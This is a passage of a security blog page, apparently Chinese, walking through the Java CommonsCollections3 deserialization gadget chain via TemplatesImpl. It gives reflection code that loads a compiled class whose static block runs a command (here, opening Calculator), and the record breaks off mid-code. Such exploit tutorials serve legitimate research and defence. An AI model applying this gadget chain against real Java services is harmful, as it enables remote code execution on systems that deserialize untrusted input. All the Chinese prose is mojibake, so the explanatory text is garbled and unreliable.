<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="CTF,Java,Web,JavaScript,Linux">
    <meta name="description" content="è®°å½•ä¸€äº›å¥‡å¥‡æ€ªæ€ªä¹±ä¸ƒå…«ç³Ÿçš„ä¸œè¥¿">
    <meta name="author" content="y1zh3e7">
    
    <title>
        
            CommonsCollections3 |
        
        y1â€™s Blog
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    <link rel="shortcut icon" href="/images/logo.jpg">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/regular.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/solid.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/brands.min.css">
    <script id="hexo-configurations">
    let KEEP = window.KEEP || {}
    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.json"}
    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","logo":"/images/logo.jpg","favicon":"/images/logo.jpg","avatar":"/images/avatar.jpg","font_size":"21px","font_family":"STHeiti","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/cover.jpg","description":"ä¸€åªåç‰¢çš„webğŸ¶ || æ‡‚è¿›æ”»çŸ¥é˜²å®ˆï¼Œå…ˆæ­£å‘åé€†å‘","font_color":"#FFFFFF","hitokoto":false},"scroll":{"progress_bar":true,"percent":true}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":true},"comment":{"enable":true,"use":"valine","valine":{"appid":"yCemvr5nGXrJlWRCN3SLWLLy-MdYXbMMI","appkey":"7gIuYJ9YQk94en6wRudankYd","server_urls":"https://ycemvr5n.api.lncldglobal.com","placeholder":"Hi speak somethingï¼"},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"center","copyright_info":false},"version":"3.6.1"}
    KEEP.language_ago = {"second":"%s ç§’å‰","minute":"%s åˆ†é’Ÿå‰","hour":"%s å°æ—¶å‰","day":"%s å¤©å‰","week":"%s å‘¨å‰","month":"%s ä¸ªæœˆå‰","year":"%s å¹´å‰"}
    KEEP.language_code_block = {"copy":"å¤åˆ¶ä»£ç ","copied":"å·²å¤åˆ¶","fold":"æŠ˜å ä»£ç å—","folded":"å·²æŠ˜å "}
    KEEP.language_copy_copyright = {"copy":"å¤åˆ¶ç‰ˆæƒä¿¡æ¯","copied":"å·²å¤åˆ¶","title":"åŸæ–‡æ ‡é¢˜","author":"åŸæ–‡ä½œè€…","link":"åŸæ–‡é“¾æ¥"}
  </script>
<meta name="generator" content="Hexo 7.0.0-rc1">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>


<body>
<div class="progress-bar-container">
    
        <span class="scroll-progress-bar"></span>
    

    
        <span class="pjax-progress-bar"></span>
        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
    
</div>


<main class="page-container">

    

    <div class="page-main-content">

        <div class="page-main-content-top">
            
<header class="header-wrapper">

    <div class="header-content">
        <div class="left">
            
                <a class="logo-image" href="/">
                    <img src="/images/logo.jpg">
                </a>
            
            <a class="logo-title" href="/">
               y1â€™s Blog
            </a>
        </div>

        <div class="right">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                é¦–é¡µ
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                å½’æ¡£
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/tags"
                            >
                                æ ‡ç­¾
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/categories"
                            >
                                åˆ†ç±»
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/links"
                            >
                                å‹é“¾
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/about"
                            >
                                å…³äº
                            </a>
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="fas fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">é¦–é¡µ</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">å½’æ¡£</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/tags">æ ‡ç­¾</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/categories">åˆ†ç±»</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/links">å‹é“¾</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/about">å…³äº</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle">

            <div class="main-content">

                
                    <div class="fade-in-down-animation">
    <div class="post-page-container">
        <div class="article-content-container">

            <div class="article-title">
                <span class="title-hover-animation">CommonsCollections3</span>
            </div>

            
                <div class="article-header">
                    <div class="avatar">
                        <img src="/images/avatar.jpg">
                    </div>
                    <div class="info">
                        <div class="author">
                            <span class="name">y1zh3e7</span>
                            
                                <span class="author-label">Lv2</span>
                            
                        </div>
                        <div class="meta-info">
                            
<div class="article-meta-info">
    <span class="article-date article-meta-item">
        
            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
        
        <span class="pc">2023-05-20 16:37:42</span>
        <span class="mobile">2023-05-20 16:37</span>
    </span>
    
        <span class="article-update-date article-meta-item">
        <i class="fas fa-file-pen"></i>&nbsp;
        <span class="pc">2023-09-19 12:31:51</span>
    </span>
    
    
        <span class="article-categories article-meta-item">
            <i class="fas fa-folder"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/categories/WebSec/">WebSec</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fas fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Javaååºåˆ—åŒ–</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fas fa-file-word"></i>&nbsp;<span>2.8k å­—</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fas fa-clock"></i>&nbsp;<span>12 åˆ†é’Ÿ</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                        </div>
                    </div>
                </div>
            

            <div class="article-content keep-markdown-body">
                

                <h1 id="CC1æ‰“ä¸é€šæ—¶çš„å¦å¤–ä¸€æ¡é“¾CC3"><a href="#CC1æ‰“ä¸é€šæ—¶çš„å¦å¤–ä¸€æ¡é“¾CC3" class="headerlink" title="CC1æ‰“ä¸é€šæ—¶çš„å¦å¤–ä¸€æ¡é“¾CC3"></a>CC1æ‰“ä¸é€šæ—¶çš„å¦å¤–ä¸€æ¡é“¾CC3</h1><p>åœ¨CC1å’ŒCC6ä¸­ï¼Œæˆ‘ä»¬æœ€ç»ˆå¼¹è®¡ç®—å™¨éƒ½æ˜¯é€šè¿‡<code>Runtime.exec</code>è¿›è¡Œè°ƒç”¨ï¼Œä»CC3æˆ‘ä»¬è¦ä»‹ç»ä¸€ç§ä¸é€šè¿‡Runtimeæ¥å¼¹è®¡ç®—å™¨çš„æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯Javaä¸­å¸¸æåˆ°çš„åŠ¨æ€ç±»åŠ è½½ï¼ŒåŠ¨æ€ç±»åŠ è½½å¯ä»¥è®©æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªè·¯å¾„æ¥åŠ è½½ä¸€ä¸ªæ¶æ„ç±»ï¼Œå¦‚æœè¿™ä¸ªæ¶æ„ç±»åœ¨<code>é™æ€ä»£ç å—</code>æˆ–<code>æ„é€ ä»£ç å—</code>ä¸­å†™å…¥äº†æ¶æ„æ–¹æ³•ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ‰¾ä¸€æ¡é“¾å­æ¥åˆå§‹åŒ–è¿™ä¸ªç±»ï¼ˆä¸€èˆ¬åœ¨è¿›è¡Œå®ä¾‹åŒ–æ—¶ä¼šå¯¹ç±»è¿›è¡Œåˆå§‹åŒ–ï¼‰ï¼Œä»è€Œè¾¾åˆ°ä»£ç å—ä¸­çš„ä»£ç æ‰§è¡Œã€‚</p>
<p>ClassLoaderä¸­çš„defineClassæœ€ç»ˆå®ç°äº†ç±»çš„åŠ¨æ€åŠ è½½ï¼ˆåé¢è¿˜æœ‰ä¸€äº›è¿‡ç¨‹ä½†å·²ç»æ˜¯ä¾é cæ¥å®ç°çš„äº†ï¼‰ï¼Œåœ¨ClassLoaderä¸­å¯ä»¥çœ‹åˆ°ä¸€å †defineClassï¼Œæˆ‘ä»¬æŸ¥æ‰¾ç”¨æ³•ï¼Œçœ‹ä¸€ä¸‹å“ªä¸ªdefineClassåœ¨åˆ«å¤„è¢«è°ƒç”¨äº†ï¼Œè€Œä¸”æƒé™æœ€å¥½æ˜¯defaultæˆ–è€…publicï¼Œæ–¹ä¾¿æˆ‘ä»¬åˆ©ç”¨ï¼Œæœ€ç»ˆé”å®šä¸‹é¢è¿™ä¸ªï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(String name, <span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len)</span><br><span class="line">        <span class="keyword">throws</span> ClassFormatError</span><br></pre></td></tr></tbody></table></figure>

<p>è¿™ä¸ªdefineClassè¢«è°ƒç”¨çš„ç‚¹åœ¨<code>com.sun.org.apache.xalan.internal.xsltc.trax</code>ä¸­çš„<code>TemplatesImpl.TransletClassLoader</code>ä¸‹ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªdefineClassï¼š</p>
<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230206143718657.png"></p>
<p>è¿™ä¸ªdefineClassåˆåœ¨å½“å‰ç±»ä¸­è¢«<code>defineTransletClasses</code>è°ƒç”¨ï¼š</p>
<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230206143601848.png"></p>
<p><code>defineTransletClasses</code>åŒç±»ä¸‹æœ‰ä¸‰ä¸ªè¢«è°ƒç”¨ç‚¹ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹å“ªä¸ªæ–¹æ³•å¯ä»¥è¢«æˆ‘ä»¬åˆ©ç”¨ï¼š</p>
<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230206143620851.png"></p>
<p>ç¬¬ä¸€ä¸ªè¿”å›<code>_class</code>ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">synchronized</span> Class[] getTransletClasses() {</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">catch</span> (TransformerConfigurationException e) {</span><br><span class="line">            <span class="comment">// Falls through</span></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> _class;</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>

<p>ç¬¬äºŒä¸ªè¿”å›äº†<code>_class</code>çš„ä¸‹æ ‡ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">getTransletIndex</span><span class="params">()</span> {</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">catch</span> (TransformerConfigurationException e) {</span><br><span class="line">            <span class="comment">// Falls through</span></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> _transletIndex;</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>

<p>ç¬¬ä¸‰ä¸ªæ–¹æ³•æˆ‘ä»¬ä¸»è¦çœ‹newInstanceè¿™é‡Œï¼Œè¿™ä¸ª<code>_class[_transletIndex]</code>å¯æ§ï¼ˆé€šè¿‡ä¸Šé¢æ‰¾åˆ°çš„<code>defineTransletClasses</code>åŠ¨æ€åŠ è½½è¿›æ¥ï¼‰ï¼Œå¦‚æœæˆ‘ä»¬è®©_classä¸ºæˆ‘ä»¬æ‰€æ„é€ çš„æ¶æ„ç±»å¹¶è®©å®ƒnewInstanceï¼Œé‚£ä¹ˆå°±å¯ä»¥æ‰§è¡Œæ¶æ„ç±»ä¸­çš„é™æ€/æ„é€ ä»£ç å—ä¸­çš„ä»£ç ï¼Œæ‰€ä»¥æˆ‘ä»¬æ¥ç€æ‰¾è¿™ä¸ªæ–¹æ³•çš„è°ƒç”¨ç‚¹ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException {</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">            <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">            <span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();</span><br></pre></td></tr></tbody></table></figure>

<p>ä¸‹ä¸€è°ƒç”¨ç‚¹è¿˜æ˜¯åœ¨è¿™ä¸ªç±»ä¸­ï¼Œæˆ‘ä»¬æ‰¾åˆ°newTransformer()è¿™ä¸ªæ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title function_">newTransformer</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException</span><br><span class="line">    {</span><br><span class="line">        TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">        transformer = <span class="keyword">new</span> <span class="title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,</span><br><span class="line">            _indentNumber, _tfactory);</span><br></pre></td></tr></tbody></table></figure>

<p>æˆ‘ä»¬æ¥æ¢³ç†ä¸€ä¸‹åˆ°ç›®å‰çš„è°ƒç”¨é“¾ï¼Œå¾ˆçŸ­ä¹Ÿå¾ˆæ–¹ä¾¿ï¼š</p>
<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230206143637167.png"></p>
<p>æˆ‘ä»¬å…ˆå°†payloadå†™å‡ºæ¥ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        templatesimpl.newTransformer();</span><br></pre></td></tr></tbody></table></figure>

<p>å†™å®Œå•¦ ä¸‹ç­ï¼ï¼ˆå¼€ä¸ªç©ç¬‘ï¼‰é€»è¾‘ä¸Šæ¥è¯´è¿™ä¸¤è¡Œä»£ç ç¡®å®æ˜¯å®Œæ•´çš„è°ƒç”¨é“¾ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥è¦åšçš„å°±æ˜¯å¯¹ç±»å†…éƒ¨çš„å„ç§å±æ€§è¿›è¡Œèµ‹å€¼ï¼š</p>
<p><code>newTransformer</code>å†…ä¸éœ€è¦è¿›è¡Œèµ‹å€¼æ“ä½œï¼Œè·Ÿè¿›åˆ°<code>getTransletInstance</code>ä¸­ ï¼Œç±»å†…æ²¡æœ‰å¯¹_nameå’Œ_classè¿›è¡Œèµ‹å€¼ï¼Œå¦‚æœæƒ³è¦è§¦å‘<code>defineTransletClasses()</code>æˆ‘ä»¬å°±éœ€è¦è®©_nameä¸ä¸ºç©ºï¼Œ_classä¸ºç©ºï¼Œç›´æ¥ä¸ç»™_classèµ‹å€¼å³å¯ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br></pre></td></tr></tbody></table></figure>

<p>ç»§ç»­è·Ÿè¿›åˆ°<code>defineTransletClasses</code>ä¸­ ï¼Œå¦‚æœæƒ³è¦èµ°åˆ°ä¸‹é¢åŠ¨æ€åŠ è½½_classï¼Œæˆ‘ä»¬è¿™é‡Œè¦æ³¨æ„å¯¹_tfactoryè¿›è¡Œèµ‹å€¼ï¼Œå¦åˆ™å¯¹ä¸€ä¸ªç©ºå±æ€§è°ƒç”¨æ–¹æ³•ï¼Œä¼šçˆ†ç©ºæŒ‡é’ˆå¼‚å¸¸ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br></pre></td></tr></tbody></table></figure>

<p>ä¸Šä¸€æ­¥ä¹‹åæˆ‘ä»¬åœ¨å¯¹_classèµ‹å€¼è¿™é‡Œå¯ä»¥çœ‹åˆ°æ˜¯é€šè¿‡ä¿®æ”¹<code>_bytecodes</code>ä»è€Œæ§åˆ¶_classçš„å€¼ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) {</span><br><span class="line">                _class[i] = loader.defineClass(_bytecodes[i]);</span><br></pre></td></tr></tbody></table></figure>

<p>ä¸€å…±ä¸‰ä¸ªéœ€è¦ä¿®æ”¹çš„å€¼ï¼ŒTemplatesImplç±»æ˜¯å¯åºåˆ—åŒ–çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡åå°„ä¿®æ”¹è¿™äº›å€¼ï¼Œçœ‹ä¸€ä¸‹è¿™å‡ ä¸ªå€¼çš„ç±»å‹:</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">String</span> <span class="variable">_name</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="type">byte</span>[][] _bytecodes = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="type">TransformerFactoryImpl</span> <span class="variable">_tfactory</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br></pre></td></tr></tbody></table></figure>

<p>éƒ½æ˜¯privateå±æ€§ï¼Œæ‰€ä»¥è¦ç”¨<code>setAccessible</code> æ¥ä¿®æ”¹è®¿é—®æƒé™ï¼Œnameæ˜¯Stringç±»å‹ï¼Œæ‰€ä»¥ç›´æ¥èµ‹ä¸ªå­—ç¬¦ä¸²å°±è¡Œï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">tmp</span> <span class="operator">=</span> templatesimpl.getClass();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tmp.getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">    nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    nameField.set(templatesimpl,<span class="string">"y1"</span>);</span><br></pre></td></tr></tbody></table></figure>

<p>å†çœ‹<code>_bytecodes</code>ï¼Œä¸€ä¸ªäºŒç»´æ•°ç»„ï¼Œä½†æˆ‘ä»¬åœ¨ç»™_classèµ‹å€¼æ—¶defineClassæ¥å—çš„å´æ˜¯ä¸€ä¸ªä¸€ç»´æ•°ç»„ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) {</span><br><span class="line">                _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line"></span><br><span class="line">Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> {</span><br><span class="line">            <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length);</span><br></pre></td></tr></tbody></table></figure>

<p>æ‰€ä»¥æˆ‘ä»¬ç»™<code>_bytecodes</code> èµ‹å€¼æ—¶å¯ä»¥å°†defineClassæ¥æ”¶çš„ä¸€ç»´æ•°ç»„æ”¾è¿›_bytecodesè¿™ä¸ªäºŒç»´æ•°ç»„ä¸­ï¼Œè¿™æ ·åœ¨è¿›è¡Œforå¾ªç¯éå†æ—¶å°±å¯ä»¥å°†è¿™ä¸ªä¸€ç»´æ•°ç»„éå†å‡ºæ¥å¹¶ä¼ ç»™defineClassï¼Œè¿™ä¸ªclasséœ€è¦æˆ‘ä»¬åœ¨å†™å¥½javaæºç åæ‰‹åŠ¨ç¼–è¯‘ä¸ºclassæ–‡ä»¶ï¼Œæœ€å¥½æŠŠè¿™ä¸ªclassæ–‡ä»¶å¤åˆ¶åˆ°ç”µè„‘ä¸Šçš„åˆ«çš„åœ°æ–¹å†åœ¨è¿™é‡Œä½¿ç”¨ï¼ˆç¼–è¯‘åçš„classæ–‡ä»¶ä¸€èˆ¬åœ¨targetä¸‹ï¼‰ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> tmp.getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">"/Users/y1zh3e7/Desktop/Test.class"</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = {code};</span><br><span class="line">        bytecodesField.set(templatesimpl,codes);</span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Test.<span class="keyword">class</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> {</span><br><span class="line">    <span class="keyword">static</span>{</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"open -na Calculator"</span>); <span class="comment">//è¿™é‡Œæ˜¯macå¼¹è®¡ç®—å™¨çš„å‘½ä»¤</span></span><br><span class="line">        } <span class="keyword">catch</span> (IOException e) {                             <span class="comment">//winä¸‹è¿˜æ˜¯calc</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>ç„¶åæˆ‘ä»¬å†æ¥æ”¹_tfactoryçš„å€¼ï¼š</p>
<p>è¿™é‡Œè¦æ³¨æ„ä¸€ä¸‹ï¼Œè¢«transientå…³é”®å­—ä¿®é¥°çš„å±æ€§æ˜¯ä¸å‚ä¸åºåˆ—åŒ–çš„ï¼Œä¹Ÿå°±æ˜¯è¯´å°±ç®—æˆ‘ä»¬é€šè¿‡åå°„ä¿®æ”¹äº†å®ƒçš„å€¼ï¼Œååºåˆ—åŒ–åçš„äºŒè¿›åˆ¶æµè¿™ä¸ªå±æ€§çš„å€¼ä¹Ÿä¾æ—§æ˜¯nullï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬è¦ç”¨å…¶ä»–çš„æ–¹å¼èµ‹å€¼</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="type">TransformerFactoryImpl</span> <span class="variable">_tfactory</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br></pre></td></tr></tbody></table></figure>

<p>æˆ‘ä»¬åœ¨readObjectä¸­å‘ç°æœ‰å¯¹è¿™äº›å±æ€§è¿›è¡Œèµ‹å€¼çš„æ“ä½œï¼Œ_tfactoryçš„å€¼æ˜¯ä¸€ä¸ªTransformerFactoryImplå®ä¾‹ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">_name = (String)gf.get(<span class="string">"_name"</span>, <span class="literal">null</span>);</span><br><span class="line">   <span class="comment">//ä»¥ä¸‹å‡ è¡Œä»£ç å¯¹åºåˆ—åŒ–æµä¸­çš„å±æ€§è¯»å–å®ƒä»¬çš„å€¼ï¼Œå¦‚æœè¯»ä¸åˆ°å€¼é‚£ä¹ˆå°†å®ƒçš„å€¼è®¾ä¸ºé»˜è®¤å€¼ï¼ˆç¬¬äºŒä¸ªå‚æ•°ï¼‰    </span></span><br><span class="line">			  _bytecodes = (<span 